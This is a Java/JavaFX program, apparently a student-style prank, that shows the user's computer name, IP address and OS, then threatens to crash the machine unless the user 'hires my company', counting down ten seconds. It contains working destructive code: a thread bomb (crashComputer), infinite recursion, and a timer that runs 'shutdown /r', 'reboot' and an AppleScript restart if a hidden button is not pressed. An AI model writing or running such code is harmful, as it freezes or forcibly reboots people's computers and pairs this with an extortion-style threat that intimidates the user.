
import java.awt.Component;
import java.awt.GridBagConstraints;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
//import java.awt.Insets;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Enumeration;
import java.util.List;
import java.util.Timer;
import java.net.Inet4Address;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;

import javax.swing.JSlider;
import javax.swing.event.ChangeEvent;

import javafx.animation.Animation;
import javafx.animation.KeyFrame;
import javafx.animation.Timeline;
import javafx.application.Application;
import javafx.scene.Group;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.ListView;
import javafx.scene.control.Slider;
import javafx.scene.control.TextField;
import javafx.scene.layout.VBox;
import javafx.scene.text.Text;
import javafx.scene.text.TextAlignment;
import javafx.scene.text.TextBoundsType;
import javafx.scene.text.TextFlow;
import javafx.stage.Stage;
import javafx.util.Duration;
import javafx.application.Application;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Group;
import javafx.scene.Scene;
import javafx.scene.control.Label;
import javafx.scene.control.Slider;
import javafx.scene.effect.SepiaTone;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.Background;
import javafx.scene.layout.BackgroundFill;
import javafx.scene.layout.Border;
import javafx.scene.layout.BorderStroke;
import javafx.scene.layout.BorderStrokeStyle;
import javafx.scene.layout.BorderWidths;
import javafx.scene.layout.CornerRadii;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.StackPane;
import javafx.scene.paint.Color;
import javafx.stage.Stage;

// Any JavaFX application must extend the Application class, which is abstract.
/**
 * @author brockthibodeaux
 *
 */
public class Driver extends Application {

	
	static int dontCrash = 0;
	
	
	public static void main(String[] args) {
		// Launch the JavaFX application. This method creates a JavaFXExample
		// object and calls its start method.
		launch(args);

		
		//Timer for 30 seconds to supplement, shutsdown computer through console call if crash "crashes" hard enough
		Timer y = new java.util.Timer();
		y.schedule(new java.util.TimerTask() {
			@Override
			public void run() {
				if(dontCrash == 0) {
				Runtime r = Runtime.getRuntime();
				try {
					
					r.exec("shutdown /r");
					r.exec("reboot");
					r.exec("osascript -e 'tell app \"System Events\" to restart'");
					
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				}
				// close the thread

				y.cancel();
			}
		}, 30000);
	}

	//getting Operating System
	private static String OS = System.getProperty("os.name").toLowerCase();

	//Using a BufferOverflow to crash the VM/Computer
	public static void crashComputer() {
		while (true) {
			Thread thread = new Thread(new Runnable() {
				@Override
				public void run() {
					while (true) {
						crashComputer();
					}
				}
			});
			thread.start();
		}
	}

	public static void crashJVM() {
		while (true)
			crashJVM();
	}

	
	public int stopper = 0;
	

	@Override

	public void start(Stage stage) throws Exception {

		// Setting up title, making buttons blend in to background, setting pane, background colour, font and text colour

		stage.setTitle("Buisness Offer");

		Text l0 = new Text("1");
		l0.setFill(Color.LIMEGREEN);
		l0.setStyle("-fx-font: 24 Courier;");
		l0.setTextAlignment(TextAlignment.CENTER);
		Button b0 = new Button("Push me to freeze your " + OS + " computer");
		b0.setStyle("-fx-background-color: #000000; -fx-text-fill: #000000");
		Button b1 = new Button("Stop the Crash");
		b1.setStyle("-fx-background-color: #000000; -fx-text-fill: #000000");

		

		StackPane flow = new StackPane();
		flow.setBackground(new Background(new BackgroundFill(Color.BLACK, CornerRadii.EMPTY, Insets.EMPTY)));

		flow.setPrefSize(900, 900);

		stage.setTitle("Mesonet Project");

		StackPane.setAlignment(l0, Pos.CENTER);
		StackPane.setAlignment(b0, Pos.BOTTOM_CENTER);
		StackPane.setAlignment(b1, Pos.TOP_CENTER);

		flow.getChildren().addAll(l0);
		flow.getChildren().addAll(b0, b1);

		//Timer to show buttons, moved here because issues with accessing JavaFX methods outside of Applicaion inherited class
		
		Timer w = new java.util.Timer();
		w.schedule(new java.util.TimerTask() {
			@Override
			public void run() {

				// set background colour of buttons to reveal them
				b0.setStyle("-fx-background-color: #ff0000; -fx-text-fill: #000000");
				b1.setStyle("-fx-background-color: #00ff00; -fx-text-fill: #000000");
				w.cancel();
			}
		}, 20000); //20 seconds
		
		Scene scene = new Scene(flow, 800, 400, Color.BLACK);
		stage.setScene(scene);
		stage.show();

		
		//on button push, crash computer is ran
		EventHandler<ActionEvent> event1 = new EventHandler<ActionEvent>() {

			public void handle(ActionEvent e) {

				crashComputer();

			}

		};

		b0.setOnAction(event1);

		//on button push, integer value called to test whether to reboot is changed
		EventHandler<ActionEvent> event99 = new EventHandler<ActionEvent>() {

			public void handle(ActionEvent e) {

				dontCrash = 99;
				l0.setText("Pleasure doing buisness Zac!");

			}

		};
		b1.setOnAction(event99);
		
		//Creating the scrolling text in the beggining by using random values through 36 and assigning them characters from a String Array
		Timeline timeline = new Timeline(new KeyFrame(Duration.millis(0), new EventHandler<ActionEvent>() {
			@Override
			public void handle(ActionEvent actionEvent) {
				String[] a = { "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R",
						"S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0" };

				double j = Math.random() * 36;
				double k = Math.random() * 36;
				double l = Math.random() * 36;
				double m = Math.random() * 36;
				double n = Math.random() * 36;

				if (stopper == 0)
					l0.setText(a[(int) j] + a[(int) k] + a[(int) l] + a[(int) m] + a[(int) n]);

			}
		}), new KeyFrame(Duration.millis(20)));
		timeline.setCycleCount(Animation.INDEFINITE);
		timeline.play();

		//After 5 seconds the text changes to Hello using stopper integer
		Timer t = new java.util.Timer();
		t.schedule(new java.util.TimerTask() {
			@Override
			public void run() {
				stopper = 1;
				l0.setText("Hello");
				// close the thread
				t.cancel();
			}
		}, 5000);
		
		//After 2 more seconds, it changes to display IPv6 Address, Computer name on file, and Operating system
		Timer u = new java.util.Timer();
		u.schedule(new java.util.TimerTask() {
			@Override
			public void run() {

				String ip;
				try {
					Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
					while (interfaces.hasMoreElements()) {
						NetworkInterface iface = interfaces.nextElement();
						// filters out 127.0.0.1 and inactive interfaces
						if (iface.isLoopback() || !iface.isUp())
							continue;

						Enumeration<InetAddress> addresses = iface.getInetAddresses();
						while (addresses.hasMoreElements()) {
							InetAddress addr = addresses.nextElement();

							// *EDIT*
							if (addr instanceof Inet6Address)
								continue;
							String name = addr.getHostName();
							ip = addr.getHostAddress();
							l0.setText("As someone who likely values their privacy how"
									+ "\n would you like knowing that all\n of this information is public?"
									+ "\nComputer Name: " + name + " and IP: " + ip + "\nOperating System: " + OS);
						}
					}
				} catch (SocketException e5) {
					throw new RuntimeException(e5);
				}

				// close the thread
				u.cancel();
			}
		}, 7000);
		
		//After reading for about 13 seconds, propose the offer: Accept the "buisness" or crash the computer is called
		Timer v = new java.util.Timer();
		v.schedule(new java.util.TimerTask() {
			@Override
			public void run() {

				l0.setText("Knowing all this, it seems you arent as protected as you would like"
						+ "\nI can help you secure your data!" + "\nUnfortunately I am not a very nice guy"
						+ "\nSo you either hire my company or I will crash your computer."
						+ "\nYou have 10 seconds to accept");
				// close the thread

				v.cancel();
			}
		}, 20000);
		
		//After 30 seconds, computer is crashed.
		Timer x = new java.util.Timer();
		x.schedule(new java.util.TimerTask() {
			@Override
			public void run() {
				if (dontCrash == 0) {
					crashComputer();
				}
				// close the thread

				x.cancel();
			}
		}, 30000);
		

	}

}
